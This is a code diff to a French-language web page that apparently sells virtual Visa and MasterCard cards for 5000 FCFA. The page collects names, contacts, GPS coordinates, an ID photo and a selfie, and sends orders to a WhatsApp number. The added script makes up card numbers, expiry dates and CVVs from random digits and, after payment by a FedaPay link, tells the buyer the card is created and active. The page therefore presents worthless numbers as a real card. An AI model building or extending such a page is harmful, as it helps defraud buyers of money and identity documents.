@@ -177,6 +177,44 @@
             margin-top: 5px;
         }
 
+        /* Style pour l'affichage des détails de la carte sélectionnée */
+        .card-details-display {
+            background: linear-gradient(135deg, #f0f4ff, #e8eeff);
+            border-radius: 16px;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: center;
+            border: 1px solid #c5d5f5;
+            transition: all 0.3s ease;
+        }
+
+        .card-details-display.visa {
+            background: linear-gradient(135deg, #1a237e, #283593);
+            color: white;
+        }
+
+        .card-details-display.mastercard {
+            background: linear-gradient(135deg, #000000, #ff5f00);
+            color: white;
+        }
+
+        .card-type-icon {
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+
+        .card-number-display {
+            font-family: monospace;
+            font-size: 18px;
+            letter-spacing: 2px;
+            margin: 10px 0;
+        }
+
+        .card-expiry-display {
+            font-size: 14px;
+            margin-top: 5px;
+        }
+
         /* Formulaire */
         .form-section {
             padding: clamp(20px, 5vw, 40px);
@@ -493,7 +531,6 @@
             }
         }
 
-        /* Support des écrans très larges */
         @media (min-width: 1600px) {
             body {
                 padding: 40px;
@@ -508,14 +545,12 @@
             }
         }
 
-        /* Support des écrans tactiles */
         @media (hover: none) and (pointer: coarse) {
             .btn:hover, .fee-item:hover, .file-upload:hover {
                 transform: none;
             }
         }
 
-        /* Animation de chargement */
         @keyframes shimmer {
             0% { background-position: -1000px 0; }
             100% { background-position: 1000px 0; }
@@ -572,7 +607,7 @@
                 </div>
                 <div class="fee-item">
                     <div class="fee-label">🔧 Frais de maintenance</div>
-                    <div class="fee-value">100 FCFA/mois</div>
+                    <div class="fee-value">5 FCFA/mois</div>
                 </div>
             </div>
         </div>
@@ -727,15 +762,23 @@
                     </div>
                 </div>
                 
-                <h2 class="section-title">ℹ️ Informations supplémentaires</h2>
+                <h2 class="section-title">💳 Type de carte virtuelle</h2>
+                
+                <!-- Affichage dynamique des détails de la carte sélectionnée -->
+                <div id="cardDetailsDisplay" class="card-details-display" style="display: none;">
+                    <div class="card-type-icon" id="cardTypeIcon">💳</div>
+                    <div class="card-number-display" id="cardNumberDisplay"></div>
+                    <div class="card-holder-display" id="cardHolderDisplay"></div>
+                    <div class="card-expiry-display" id="cardExpiryDisplay"></div>
+                    <div class="card-cvv-display" id="cardCvvDisplay"></div>
+                </div>
                 
                 <div class="form-group">
                     <label for="cardType" class="required">Type de carte virtuelle</label>
                     <select id="cardType" name="cardType" required>
                         <option value="">Sélectionnez un type</option>
                         <option value="visa">💳 Visa</option>
-                        <option value="mastercard">💳 Mastercard</option>
-                        <option value="paypal">💳 PayPal</option>
+                        <option value="mastercard">💳 MasterCard</option>
                     </select>
                 </div>
                 
@@ -768,7 +811,7 @@
                     <li>🏧 Les frais de retrait de 9% sont appliqués à chaque retrait d'argent</li>
                     <li>📊 Le montant minimum de chargement est de 1 000 FCFA</li>
                     <li>💎 Le montant maximum de chargement est de 10 000 FCFA</li>
-                    <li>🔧 Des frais de maintenance mensuels de 100 FCFA sont prélevés</li>
+                    <li>🔧 Des frais de maintenance mensuels de 5 FCFA sont prélevés</li>
                     <li>⏰ La carte est valable 5 ans à compter de la date d'activation</li>
                 </ul>
             </div>
@@ -778,6 +821,84 @@
     </div>
 
     <script>
+        // Fonctions pour générer les informations de la carte
+        function generateCardNumber(cardType) {
+            let prefix = '';
+            if (cardType === 'visa') {
+                prefix = '4';
+            } else if (cardType === 'mastercard') {
+                prefix = '5';
+            } else {
+                prefix = '4';
+            }
+            
+            let cardNumber = prefix;
+            for (let i = 0; i < 15; i++) {
+                cardNumber += Math.floor(Math.random() * 10);
+            }
+            
+            return cardNumber.replace(/(\d{4})/g, '$1 ').trim();
+        }
+        
+        function generateExpiryDate() {
+            const now = new Date();
+            const expiryYear = now.getFullYear() + 5;
+            const expiryMonth = now.getMonth() + 1;
+            return `${expiryMonth.toString().padStart(2, '0')}/${expiryYear.toString().slice(-2)}`;
+        }
+        
+        function generateCVV() {
+            return Math.floor(100 + Math.random() * 900).toString();
+        }
+        
+        function updateCardDisplay() {
+            const cardType = document.getElementById('cardType').value;
+            const firstName = document.getElementById('firstName').value;
+            const lastName = document.getElementById('lastName').value;
+            const cardDetailsDisplay = document.getElementById('cardDetailsDisplay');
+            const cardTypeIcon = document.getElementById('cardTypeIcon');
+            const cardNumberDisplay = document.getElementById('cardNumberDisplay');
+            const cardHolderDisplay = document.getElementById('cardHolderDisplay');
+            const cardExpiryDisplay = document.getElementById('cardExpiryDisplay');
+            const cardCvvDisplay = document.getElementById('cardCvvDisplay');
+            
+            if (cardType && firstName && lastName) {
+                const cardNumber = generateCardNumber(cardType);
+                const expiryDate = generateExpiryDate();
+                const cvv = generateCVV();
+                const cardHolder = `${firstName.toUpperCase()} ${lastName.toUpperCase()}`;
+                
+                if (cardType === 'visa') {
+                    cardTypeIcon.innerHTML = '💳 VISA';
+                    cardDetailsDisplay.className = 'card-details-display visa';
+                } else if (cardType === 'mastercard') {
+                    cardTypeIcon.innerHTML = '💳 MasterCard';
+                    cardDetailsDisplay.className = 'card-details-display mastercard';
+                }
+                
+                cardNumberDisplay.textContent = cardNumber;
+                cardHolderDisplay.textContent = `Titulaire: ${cardHolder}`;
+                cardExpiryDisplay.textContent = `Valable jusqu'au: ${expiryDate}`;
+                cardCvvDisplay.textContent = `CVV: ${cvv}`;
+                cardDetailsDisplay.style.display = 'block';
+                
+                window.generatedCardInfo = {
+                    cardNumber: cardNumber,
+                    expiryDate: expiryDate,
+                    cvv: cvv,
+                    cardHolder: cardHolder,
+                    cardType: cardType
+                };
+            } else {
+                cardDetailsDisplay.style.display = 'none';
+            }
+        }
+        
+        // Écouter les changements sur les champs qui affectent l'affichage
+        document.getElementById('cardType').addEventListener('change', updateCardDisplay);
+        document.getElementById('firstName').addEventListener('input', updateCardDisplay);
+        document.getElementById('lastName').addEventListener('input', updateCardDisplay);
+        
         // Génération des coordonnées GPS
         document.getElementById('generateGps').addEventListener('click', function() {
             const gpsInput = document.getElementById('gps');
@@ -819,8 +940,7 @@
             if (file) {
                 const reader = new FileReader();
                 reader.onload = function(e) {
-                    const preview = document.getElementById('idCardPreview');
-                    preview.innerHTML = `<img src="${e.target.result}" alt="Pièce d'identité">`;
+                    document.getElementById('idCardPreview').innerHTML = `<img src="${e.target.result}" alt="Pièce d'identité">`;
                 }
                 reader.readAsDataURL(file);
             }
@@ -831,8 +951,7 @@
             if (file) {
                 const reader = new FileReader();
                 reader.onload = function(e) {
-                    const preview = document.getElementById('selfiePreview');
-                    preview.innerHTML = `<img src="${e.target.result}" alt="Selfie avec pièce d'identité">`;
+                    document.getElementById('selfiePreview').innerHTML = `<img src="${e.target.result}" alt="Selfie avec pièce d'identité">`;
                 }
                 reader.readAsDataURL(file);
             }
@@ -867,6 +986,13 @@
                 return;
             }
             
+            const cardInfo = window.generatedCardInfo || {};
+            const cardNumber = cardInfo.cardNumber || 'Généré à la validation';
+            const cardExpiry = cardInfo.expiryDate || 'Généré à la validation';
+            const cardCvv = cardInfo.cvv || 'Généré à la validation';
+            const cardHolderName = cardInfo.cardHolder || `${formValues.firstName} ${formValues.lastName}`;
+            const cardTypeName = formValues.cardType === 'visa' ? 'VISA' : 'MasterCard';
+            
             const message = `🆕 *NOUVELLE COMMANDE DE CARTE VIRTUELLE*%0A%0A` +
                             `👤 *INFORMATIONS PERSONNELLES*%0A` +
                             `Prénom: ${formValues.firstName}%0A` +
@@ -890,12 +1016,24 @@
                             `Coordonnées GPS: ${formValues.gps || 'Non générées'}%0A%0A` +
                             
                             `💳 *CARTE VIRTUELLE*%0A` +
-                            `Type: ${formValues.cardType}%0A` +
+                            `Type: ${cardTypeName}%0A` +
+                            `Numéro de carte: ${cardNumber}%0A` +
+                            `Titulaire: ${cardHolderName}%0A` +
+                            `Date d'expiration: ${cardExpiry}%0A` +
+                            `CVV: ${cardCvv}%0A` +
                             `Objet: ${formValues.purpose}%0A` +
-                            `Notes: ${formValues.notes || 'Aucune'}`;
+                            `Notes: ${formValues.notes || 'Aucune'}%0A%0A` +
+                            
+                            `💰 *FRAIS APPLICABLES*%0A` +
+                            `Frais d'acquisition: 5000 FCFA%0A` +
+                            `Frais de maintenance mensuels: 5 FCFA%0A` +
+                            `Frais de chargement: 5%%0A` +
+                            `Frais de retrait: 9%%0A%0A` +
+                            
+                            `📅 *Date de la commande*: ${new Date().toLocaleString('fr-FR')}`;
             
-            const whatsappNumber = '92871605';
-            window.open(`https://wa.me/${whatsappNumber}?text=${message}`, '_blank');
+            const whatsappNumber = '22892871605';
+            window.open(`https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`, '_blank');
         });
         
         // Gestion du bouton de paiement
@@ -921,9 +1059,71 @@
                 return;
             }
             
+            // Générer les informations de la carte avant le paiement
+            const firstName = document.getElementById('firstName').value;
+            const lastName = document.getElementById('lastName').value;
+            const cardType = document.getElementById('cardType').value;
+            
+            if (cardType && firstName && lastName) {
+                const cardNumber = generateCardNumber(cardType);
+                const expiryDate = generateExpiryDate();
+                const cvv = generateCVV();
+                const cardHolder = `${firstName.toUpperCase()} ${lastName.toUpperCase()}`;
+                
+                sessionStorage.setItem('pendingCardOrder', JSON.stringify({
+                    cardNumber: cardNumber,
+                    expiryDate: expiryDate,
+                    cvv: cvv,
+                    cardHolder: cardHolder,
+                    cardType: cardType,
+                    firstName: firstName,
+                    lastName: lastName,
+                    email: document.getElementById('email').value,
+                    phone: document.getElementById('phone').value
+                }));
+            }
+            
             alert('🔄 Redirection vers la page de paiement sécurisé FedaPay de 5000 FCFA...');
             window.location.href = 'https://me.fedapay.com/ZZTZ6KSL';
         });
+        
+        // Vérifier s'il y a un paiement en attente
+        function checkPendingPayment() {
+            const pendingOrder = sessionStorage.getItem('pendingCardOrder');
+            if (pendingOrder) {
+                const orderData = JSON.parse(pendingOrder);
+                const cardTypeName = orderData.cardType === 'visa' ? 'VISA' : 'MasterCard';
+                const message = `✅ *PAIEMENT VALIDÉ - COMMANDE DE CARTE VIRTUELLE*%0A%0A` +
+                                `👤 *CLIENT*%0A` +
+                                `Nom: ${orderData.firstName} ${orderData.lastName}%0A` +
+                                `Email: ${orderData.email}%0A` +
+                                `Téléphone: ${orderData.phone}%0A%0A` +
+                                `💳 *CARTE GÉNÉRÉE*%0A` +
+                                `Type: ${cardTypeName}%0A` +
+                                `Numéro: ${orderData.cardNumber}%0A` +
+                                `Titulaire: ${orderData.cardHolder}%0A` +
+                                `Date d'expiration: ${orderData.expiryDate}%0A` +
+                                `CVV: ${orderData.cvv}%0A%0A` +
+                                `💰 *MONTANT PAYÉ*: 5000 FCFA%0A` +
+                                `📅 *Date*: ${new Date().toLocaleString('fr-FR')}%0A%0A` +
+                                `🎉 *COMMANDE VALIDÉE - CARTE ACTIVE* 🎉`;
+                
+                setTimeout(() => {
+                    window.open(`https://wa.me/22892871605?text=${encodeURIComponent(message)}`, '_blank');
+                }, 500);
+                
+                alert(`✅ Félicitations ! Votre carte ${cardTypeName} a été créée avec succès !\n\n` +
+                      `💳 Numéro: ${orderData.cardNumber}\n` +
+                      `📅 Expiration: ${orderData.expiryDate}\n` +
+                      `🔒 CVV: ${orderData.cvv}\n\n` +
+                      `📱 Un message de confirmation a été envoyé à l'administrateur.`);
+                
+                sessionStorage.removeItem('pendingCardOrder');
+            }
+        }
+        
+        // Vérifier au chargement de la page
+        checkPendingPayment();
     </script>
 </body>
 </html>
